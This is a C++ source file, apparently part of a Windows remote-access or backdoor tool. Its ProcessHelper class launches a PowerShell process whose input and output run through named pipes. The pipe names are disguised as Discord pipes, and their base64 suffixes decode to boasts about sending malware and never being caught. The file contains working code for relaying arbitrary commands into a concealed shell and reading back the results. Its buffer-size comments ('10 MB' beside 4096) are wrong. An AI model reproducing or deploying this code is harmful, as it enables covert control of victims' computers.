#include <vector>
#include <Windows.h>
#include <string>
#include <iostream>
#include "ProcessHelper.h"

#define BUFSIZE 4096

HANDLE ProcessHelper::stdInPipe = NULL;
HANDLE ProcessHelper::stdOutPipe = NULL;

std::wstring ProcessHelper::stdInPipeName = L"\\\\.\\pipe\\discord-SGVyZSB3ZSB3aWxsIHNlbmQgdGhlIG1vc3QgYmFkYXNzIG1hbHdhcmUu";
std::wstring ProcessHelper::stdOutPipeName = L"\\\\.\\pipe\\discord-WW91IGN1cmlvdXMgYmFzdGFyZCEgWW91IHdpbGwgbmV2ZXIgY2F0Y2ggbWU";

void ProcessHelper::create_powershell_process() {
    LPSTARTUPINFOW       si;
    PPROCESS_INFORMATION pi;

    SECURITY_ATTRIBUTES saAttr;

    ZeroMemory(&saAttr, sizeof(saAttr));
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    ProcessHelper::stdInPipe = CreateNamedPipe(
        ProcessHelper::stdInPipeName.c_str(),
        PIPE_ACCESS_OUTBOUND,
        PIPE_TYPE_BYTE | PIPE_WAIT,
        1,
        4096, // 10 MB
        4096, // 10 MB
        0,
        &saAttr);

    if (ProcessHelper::stdInPipe == INVALID_HANDLE_VALUE) {
        std::cout << "[!] Pipe creation failed: " << GetLastError() << std::endl;
        return;
    }

    HANDLE stdInPipeRead = CreateFile(
        ProcessHelper::stdInPipeName.c_str(),
        GENERIC_READ,
        0,
        &saAttr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
        );

    if (stdInPipeRead == INVALID_HANDLE_VALUE) {
        std::cout << "[!] Error: " << std::endl;
        return;
    }

    ProcessHelper::stdOutPipe = CreateNamedPipe(
        ProcessHelper::stdOutPipeName.c_str(),
        PIPE_ACCESS_INBOUND,
        PIPE_TYPE_BYTE | PIPE_WAIT,
        1,
        4096,
        4096,
        0,
        &saAttr);

    if (ProcessHelper::stdOutPipe == INVALID_HANDLE_VALUE) {
        std::cout << "[!] Pipe creation failed: " << GetLastError() << std::endl;
        return;
    }

    HANDLE stdOutPipeWrite = CreateFile(
        ProcessHelper::stdOutPipeName.c_str(),
        GENERIC_WRITE,
        0,
        &saAttr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (stdOutPipeWrite == INVALID_HANDLE_VALUE) {
        std::cout << "[!] Error: " << std::endl;
        return;
    }

    BOOL                 success;

    si = new STARTUPINFOW();
    ZeroMemory(si, sizeof(STARTUPINFO));
    si->cb = sizeof(STARTUPINFO);
    si->hStdInput = stdInPipeRead;
    si->hStdOutput = stdOutPipeWrite;
    si->dwFlags |= STARTF_USESTDHANDLES;

    SetHandleInformation(stdInPipe, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(stdOutPipe, HANDLE_FLAG_INHERIT, 0);

    pi = new PROCESS_INFORMATION();

    wchar_t cmd[] = L"C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe\0";

    success = CreateProcess(
        NULL,
        cmd,
        NULL,
        NULL,
        TRUE,
        0,
        NULL,
        NULL,
        si,
        pi);

    if (!success) {
        printf("[x] CreateProcess failed.");
        return;
    }

    printf("dwProcessId : %d\n", pi->dwProcessId);
    printf("dwThreadId  : %d\n", pi->dwThreadId);
    printf("hProcess    : %p\n", pi->hProcess);
    printf("hThread     : %p\n", pi->hThread);


    CloseHandle(pi->hThread);
    CloseHandle(pi->hProcess);
}

std::string ProcessHelper::read_output() {
    DWORD dwRead;
    BYTE chBuf[BUFSIZE];
    BOOL bSuccess = FALSE;
    std::string completeResult = "";

    bSuccess = ReadFile(ProcessHelper::stdOutPipe, chBuf, BUFSIZE, &dwRead, NULL);

    char str[(sizeof chBuf) + 1];
    memcpy(str, chBuf, dwRead);
    str[dwRead] = 0;

    std::string tempResult(str);
    completeResult += tempResult;

    return tempResult;
}

void ProcessHelper::write_input(std::string cmd) {
    DWORD dwWritten = 0;
    cmd += "\n";
    bool bSuccessWrite = WriteFile(
        ProcessHelper::stdInPipe,
        cmd.c_str(),
        cmd.length(),
        &dwWritten,
        NULL
    );
    
    if (!bSuccessWrite) {
        std::cout << "[!] Error: " << GetLastError() << std::endl;
        return;
    }
}